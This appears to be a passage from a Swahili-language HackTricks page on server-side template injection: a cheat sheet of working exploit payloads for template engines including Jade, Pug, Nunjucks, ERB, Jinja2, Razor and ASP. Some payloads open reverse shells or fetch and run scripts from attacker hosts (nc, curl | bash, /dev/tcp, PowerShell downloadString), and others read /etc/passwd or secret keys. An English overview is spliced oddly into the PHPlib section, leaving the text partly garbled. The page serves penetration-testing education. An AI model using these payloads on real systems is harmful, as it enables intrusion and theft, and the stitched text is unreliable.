$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Maelezo zaidi**

* Katika sehemu ya Twig na Twig (Sandboxed) ya [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates ni injini ya templeti inayotumika kwa PHP, ikichota msukumo kutoka kwa Twig. Hata hivyo, tofauti na Twig, ambayo inaleta sintaksia mpya, Plates inatumia kanuni ya asili ya PHP katika templeti, hivyo kuifanya iwe rahisi kwa watengenezaji wa PHP.

Mfumo wa Kudhibiti:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
Template ya Ukurasa:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
Muundo wa kigezo:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**Maelezo zaidi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib na HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) ni sawa na PHPlib lakini imehamishiwa kwa Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# SSTI (Server-Side Template Injection)

## Description

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template. This can lead to remote code execution, information disclosure, and other security risks.

## Exploitation

To exploit SSTI, an attacker needs to identify a vulnerable server-side template and inject their payload into it. The payload can be crafted to execute arbitrary code or retrieve sensitive information from the server.

One common way to identify SSTI vulnerabilities is by injecting template-specific syntax and observing the server's response. If the injected code is executed or if there are error messages indicating template parsing issues, it is likely that the application is vulnerable to SSTI.

## Prevention

To prevent SSTI vulnerabilities, it is important to follow secure coding practices:

1. **Input validation and sanitization**: Always validate and sanitize user input before using it in server-side templates. This helps prevent malicious code injection.

2. **Template engine configuration**: Configure the template engine to restrict access to sensitive objects and functions. Limit the capabilities of the template engine to minimize the impact of potential SSTI vulnerabilities.

3. **Least privilege principle**: Ensure that the server-side templates have the least privileges necessary to perform their intended functions. Avoid granting unnecessary permissions that could be abused by an attacker.

4. **Regular updates and patches**: Keep the server-side template engine and its dependencies up to date with the latest security patches. This helps mitigate known vulnerabilities.

## References

- [OWASP Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**Maelezo zaidi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Maelezo zaidi**

* Katika sehemu ya Jade ya [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) ni injini ya templeti ya PHP ambayo haijatumiwa kwa kubadilisha, inatumia vitambulisho vya XML kuigawa hati katika sehemu tofauti
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**Maelezo zaidi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

Ufuatiliaji wa Njia (taarifa zaidi [hapa](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Kosa
* ${7\*7} = ${7\*7}
* Hakuna
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Maelezo zaidi**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Kigezo** | **Maelezo**                             |
| ------------ | --------------------------------------- |
|              | Tathmini na toa matokeo              |
|              | Tathmini na toa matokeo yaliyofichwa kwenye HTML |
|              | Maoni                                 |
| na          | Ruhusu nambari (imelemazwa kwa chaguo-msingi)        |

* \= 49

**Upande wa Mteja**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Upande wa Seva**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Maelezo zaidi**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Mfano wa upande wa seva wa kuchora**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Maelezo zaidi**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Hakuna matokeo
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Kosa
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Maelezo zaidi**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Kosa`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Maelezo zaidi**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Maelezo zaidi**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Angalia ukurasa ufuatao ili kujifunza mbinu za **utekelezaji wa amri za kiholela kwa kuzidisha sanduku la mchanga** katika python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Maelezo zaidi**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[Tovuti rasmi](http://jinja.pocoo.org)

> Jinja2 ni injini kamili ya templeti kwa Python. Inaunga mkono unicode kamili, mazingira ya utekelezaji yaliyosanifishwa kwa hiari, inatumika sana na leseni ya BSD.

* `{{7*7}} = Kosa`
* `${7*7} = ${7*7}`
* `{{foobar}} Hakuna kitu`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Muundo wa Kigezo**

Jinja2 ni injini ya kigezo inayotumiwa sana katika maendeleo ya wavuti. Inaruhusu watengenezaji kuunda na kusimamia vigezo vya wavuti kwa njia rahisi na yenye nguvu. Jinja2 hutumia sintaksia ya kipekee ili kuwezesha uingizaji wa data ndani ya templeti za wavuti.

**Kuingiza Kigezo cha Upande wa Seva (SSTI)**

Kuingiza Kigezo cha Upande wa Seva (SSTI) ni njia ya kudhibiti programu ya wavuti kwa kuingiza kanuni ya programu ndani ya kigezo cha Jinja2. Hii inaweza kusababisha utekelezaji wa kanuni ya hatari kwenye seva ya wavuti, na hivyo kusababisha ukiukaji wa usalama.

**Mbinu za Kuingiza Kigezo cha Upande wa Seva (SSTI)**

Kuna njia kadhaa za kuingiza Kigezo cha Upande wa Seva (SSTI) katika programu ya wavuti. Baadhi ya mbinu maarufu ni pamoja na:

1. Kuingiza kigezo cha Jinja2 moja kwa moja: Hii inahusisha kuingiza kigezo cha Jinja2 moja kwa moja katika sehemu ya kuingiza ya programu ya wavuti.

2. Kuingiza kigezo cha Jinja2 kupitia faili ya nje: Hii inahusisha kuingiza kigezo cha Jinja2 kupitia faili ya nje ambayo inaweza kudhibitiwa na mtumiaji.

3. Kuingiza kigezo cha Jinja2 kupitia maingiliano ya mtumiaji: Hii inahusisha kuingiza kigezo cha Jinja2 kupitia maingiliano ya mtumiaji, kama vile fomu za mtumiaji au vigezo vya URL.

**Madhara ya Kuingiza Kigezo cha Upande wa Seva (SSTI)**

Kuingiza Kigezo cha Upande wa Seva (SSTI) kunaweza kusababisha madhara makubwa kwa usalama wa programu ya wavuti. Baadhi ya madhara yanayowezekana ni pamoja na:

1. Utekelezaji wa kanuni ya hatari: Kuingiza SSTI inaweza kusababisha utekelezaji wa kanuni ya hatari kwenye seva ya wavuti, ambayo inaweza kusababisha uharibifu wa data au kudhibitiwa kwa seva.

2. Kuvuja kwa habari nyeti: Kwa kuingiza SSTI, mtumiaji anaweza kupata habari nyeti kama vile nywila au ufikiaji wa seva.

3. Ukiukaji wa usalama: Kuingiza SSTI inaweza kusababisha ukiukaji wa usalama wa programu ya wavuti, ambayo inaweza kuathiri sifa na imani ya kampuni.

**Kuzuia Kuingiza Kigezo cha Upande wa Seva (SSTI)**

Kuzuia Kuingiza Kigezo cha Upande wa Seva (SSTI) ni muhimu kwa usalama wa programu ya wavuti. Baadhi ya hatua za kuzuia ni pamoja na:

1. Kufuatilia na kusasisha matoleo ya Jinja2: Kuhakikisha kuwa matoleo ya Jinja2 yanayotumiwa ni ya hivi karibuni na yameboreshwa kwa usalama.

2. Kudhibiti kuingiza kigezo: Kuzuia kuingiza kigezo cha Jinja2 moja kwa moja au kupitia faili ya nje ambayo inaweza kudhibitiwa na mtumiaji.

3. Kufanya ukaguzi wa usalama: Kufanya ukaguzi wa usalama wa kina ili kugundua na kurekebisha mapungufu yoyote ya usalama yanayohusiana na SSTI.

Kwa kuzingatia hatua hizi za kuzuia, inawezekana kupunguza hatari ya kuingiza Kigezo cha Upande wa Seva (SSTI) na kuhakikisha usalama wa programu ya wavuti.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE isiyotegemea**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Maelezo zaidi kuhusu jinsi ya kutumia Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

Mizigo mingine katika [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**Maelezo zaidi**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= Mafanikio`
* `@() <= Mafanikio`
* `@("{{code}}") <= Mafanikio`
* `@ <= Mafanikio`
* `@{} <= KOSA!`
* `@{ <= KOSA!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

Mfumo wa .NET `System.Diagnostics.Process.Start` unaweza kutumika kuanzisha mchakato wowote kwenye seva na hivyo kuunda webshell. Unaweza kupata mfano wa programu ya wavuti inayoweza kudhurika katika [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Maelezo zaidi**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Hakuna kitu
* `<%= response.write(date()) %>` = \<Tarehe>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Maelezo Zaidi**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Hata kama ni perl, inatumia vitambulisho kama ERB katika Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Kosa`
```
<%= perl code %>
<% perl code %>
```
### SSTI katika GO

Katika injini ya templeti ya Go, uthibitisho wa matumizi yake unaweza kufanywa na mizigo maalum:

* `{{ . }}`: Inafunua muundo wa data ya kuingiza. Kwa mfano, ikiwa kitu chenye sifa ya `Password` kinapitishwa, `{{ .Password }}` inaweza kuifunua.
* `{{printf "%s" "ssti" }}`: Inatarajiwa kuonyesha herufi "ssti".
* `{{html "ssti"}}`, `{{js "ssti"}}`: Mizigo hii inapaswa kurudisha "ssti" bila kuongeza "html" au "js". Maagizo zaidi yanaweza kuchunguzwa katika nyaraka za Go [hapa](https://golang.org/pkg/text/template).

**Udanganyifu wa XSS**

Kwa kutumia pakiti ya `text/template`, XSS inaweza kuwa rahisi kwa kuingiza mizigo moja kwa moja. Kwa upande mwingine, pakiti ya `html/template` inakodisha majibu ili kuzuia hii (kwa mfano, `{{"<script>alert(1)</script>"}}` inatoa `&lt;script&gt;alert(1)&lt;/script&gt;`). Walakini, ufafanuzi na wito wa templeti katika Go unaweza kuepuka uandikishaji huu:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**Udanganyifu wa RCE**

Udanganyifu wa RCE unatofautiana sana kati ya `html/template` na `text/template`. Moduli ya `text/template` inaruhusu kuita kazi yoyote ya umma moja kwa moja (kwa kutumia thamani ya "wito"), ambayo hairuhusiwi katika `html/template`. Nyaraka kwa moduli hizi zinapatikana [hapa kwa html/template](https://golang.org/pkg/html/template/) na [hapa kwa text/template](https://golang.org/pkg/text/template/).

Kwa RCE kupitia SSTI katika Go, njia za vitu zinaweza kuitwa. Kwa mfano, ikiwa kitu kilichotolewa kina njia ya `System` inayotekeleza amri, inaweza kutumika kama `{{ .System "ls" }}`. Kupata nambari ya chanzo kwa kawaida ni muhimu ili kutumia hii, kama katika mfano uliotolewa:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Maelezo zaidi**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Mashambulizi Zaidi

Angalia sehemu iliyobaki ya [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) kwa mashambulizi zaidi. Pia unaweza kupata habari za vitambulisho vya kuvutia katika [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Msaada Unaohusiana

Ikiwa unafikiri inaweza kuwa na manufaa, soma:

* [Mbinu za Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Python magic functions](broken-reference/)

## Zana

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## Orodha ya Uchunguzi wa Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Zoezi na Marejeleo

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Hispania** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila uwanja.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
